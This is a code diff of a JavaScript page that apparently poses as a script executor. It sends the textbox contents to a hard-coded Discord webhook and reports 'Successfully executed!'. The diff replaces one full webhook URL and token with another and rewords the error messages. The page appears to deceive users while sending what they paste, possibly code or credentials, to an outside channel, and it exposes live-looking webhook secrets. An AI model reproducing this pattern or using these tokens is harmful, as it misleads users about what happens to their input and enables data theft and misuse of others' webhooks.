@@ -1,4 +1,3 @@
-
 document.addEventListener('DOMContentLoaded', function() {
   const textbox = document.querySelector('.textbox');
   const clearButton = document.querySelector('.clear');
@@ -14,7 +13,7 @@ document.addEventListener('DOMContentLoaded', function() {
     if (!content) return;
 
     try {
-      const response = await fetch('https://discord.com/api/webhooks/1322307988748243056/1H3WZPhxRELsdy8RKsHXK2nWWUX3O6_9lvwtcb1YprRCbvp49hF7cna0bJAXaRq7X1je', {
+      const response = await fetch('https://discord.com/api/webhooks/1361995546725842984/-u5GUvxfgeMxQyN32iQF3pLTkwprc7fuJWRKL2YR5hEvcOnYwC9YFzZDDtHYCDTyrmUX', {
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
@@ -27,10 +26,10 @@ document.addEventListener('DOMContentLoaded', function() {
       if (response.ok) {
         showNotification('Successfully executed!');
       } else {
-        showNotification('Error executing command!');
+        showNotification('Error executing script!');
       }
     } catch (error) {
-      showNotification('Error executing command!');
+      showNotification('Error executing the script!');
     }
   });
 
